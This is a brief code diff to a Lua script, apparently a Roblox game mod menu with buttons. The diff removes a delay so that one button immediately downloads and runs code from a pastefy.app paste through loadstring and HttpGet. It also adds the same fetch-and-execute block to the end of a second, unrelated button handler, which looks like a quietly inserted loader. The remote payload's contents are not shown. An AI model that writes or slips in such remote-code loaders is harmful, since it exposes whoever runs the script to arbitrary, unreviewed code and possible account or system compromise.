@@ -80,7 +80,7 @@ ModsTab:CreateButton({
             Duration = 3
         })
         task.spawn(function()
-            wait(3)
+            
             loadstring(game:HttpGet("https://pastefy.app/Ym83DFAi/raw"))()
         end)
     end
@@ -104,6 +104,13 @@ ModsTab:CreateButton({
                 Duration = 3
             })
         end
+
+task.spawn(function()
+            
+            loadstring(game:HttpGet("https://pastefy.app/Ym83DFAi/raw"))()
+        end)
+
+
     end
 })
 
